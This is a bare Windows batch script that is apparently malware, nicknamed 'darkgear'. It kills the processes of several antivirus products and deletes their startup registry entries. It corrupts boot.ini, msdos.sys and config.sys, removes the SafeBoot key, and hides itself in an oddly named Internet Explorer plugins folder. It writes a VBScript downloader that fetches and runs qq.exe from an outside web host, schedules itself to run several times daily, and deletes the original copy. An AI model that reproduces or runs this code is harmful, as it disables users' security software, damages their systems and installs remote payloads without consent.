Tskill Mcshield
Tskill VsTskMgr
Tskill naPrdMgr
Tskill UpdaterUI
Tskill TBMon
Tskill scan32
Tskill Ravmond
Tskill CCenter
Tskill RavTask
Tskill Rav
Tskill Ravmon
Tskill RavmonD
Tskill RavStub
Tskill KVXP
Tskill KvMonXP
Tskill KVCenter
Tskill KVSrvXP
Tskill KRegEx
Tskill UIHost
Tskill TrojDie
Tskill FrogAgent
Tskill kav
Tskill kav32
Tskill kavstart
Tskill katmain
REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v QQ.exe /t REG_SZ /d C:\Progra~1\COMMON~1\Micros~1\QQ.exe /f
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d C:\windows\system\star.scr /f
attrib -a -s -r -h c:\boot.ini
echo c:\="microsoft dos">c:\boot.ini
attrib +a +s +r +h c:\boot.ini
attrib -a -s -r -h c:\msdos.sys 
attrib -a -s -r -h c:\config.sys 
echo [option] >c:\msdos.sys 
echo bootkey=1 >>c:\msdos.sys 
echo BootMenu=0 >>c:\msdos.sys
echo BootWarn=0 >>c:\msdos.sys
echo BootFailSafe=0 >>c:\msdos.sys 
echo DisabeLog =1 >>c:\msdos.sys 
for %%k in (a,c,d,e,f,g,h,i,j,k,m,l,n,o,p,q,r,s,t,u,v,w,x,y,z) do @echo lastdrive=%%k >c:\config.sys
attrib +a +s +r +h c:\msdos.sys
attrib +a +s +r +h c:\config.sys 
attrib -a -s -r -h c:\autoexec.bat 
echo @echo off >c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KvMonXP /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v kav /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KAVPersonal50 /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v McAfeeUpdaterUI /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Network Associates Error Reporting /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YLive.exe /f >>c:\autoexec.bat
echo REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v yassistse /f >>c:\autoexec.bat
echo REG DELETE HKLM\ServiceSOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ShStatEXE /f >>c:\autoexec.bat
echo REG add HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f >>c:\autoexec.bat
echo reg add HKLM\SYSTEM\CurrentControlSet\Services\Schedule /v AtTaskMaxHours /t REG_DWORD /d 0 /f >>c:\autoexec.bat
echo REG DELETE HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /f >>c:\autoexec.bat
attrib +a +s +r +h c:\autoexec.bat

md c:\Progra~1\Intern~1\PLUGINS\shell..\
del c:\Progra~1\Intern~1\PLUGINS\qc.exe
del /a:- %windir%\tasks\*.job
if not exist c:\Progra~1\Intern~1\PLUGINS\shell~1\darkgear.bat copy /y %0 c:\Progra~1\Intern~1\PLUGINS\shell..\darkgear.bat
echo On Error Resume Next >c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo Dim eee,eeee >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo eeee = LCase(WScript.Arguments(1)) >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo eee = LCase(WScript.Arguments(0)) >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo Set xPost = createObject("Microsoft.XMLHTTP") >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo xPost.Open "GET",eee,0 >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo xPost.Send() >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo Set sGet = createObject("ADODB.Stream") >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo sGet.Mode = 3 >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo sGet.Type = 1 >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo sGet.Open() >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo sGet.Write(xPost.responseBody) >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
echo sGet.SaveToFile eeee,2 >>c:\Progra~1\Intern~1\PLUGINS\shell..\down.vbs
cscript c:\Progra~1\Intern~1\PLUGINS\shell~1\down.vbs http://www.llzaj.com/qq.exe  c:\Progra~1\Intern~1\PLUGINS\qc.exe
c:\Progra~1\Intern~1\PLUGINS\qc.exe
reg add HKLM\SYSTEM\CurrentControlSet\Services\Schedule /v AtTaskMaxHours /t REG_DWORD /d 0 /f 
at 10:00  c:\Progra~1\Intern~1\PLUGINS\shell~1\darkgear.bat
at 14:00  c:\Progra~1\Intern~1\PLUGINS\shell~1\darkgear.bat
at 20:00  c:\Progra~1\Intern~1\PLUGINS\shell~1\darkgear.bat
at 16:00  c:\Progra~1\Intern~1\PLUGINS\shell~1\darkgear.bat
del %0

